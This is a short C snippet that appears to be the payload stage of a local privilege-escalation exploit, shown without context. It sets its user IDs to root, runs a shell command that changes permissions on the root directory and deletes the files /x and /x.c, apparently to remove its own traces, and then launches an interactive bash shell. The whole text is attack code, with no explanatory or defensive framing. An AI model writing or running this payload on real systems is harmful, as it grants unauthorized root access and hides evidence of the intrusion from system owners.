main() {
  setuid(0); seteuid(0);
  system("chmod 755 /;rm -f /x; rm -f /x.c");
  execl("/bin/bash","bash","-i",0);
}

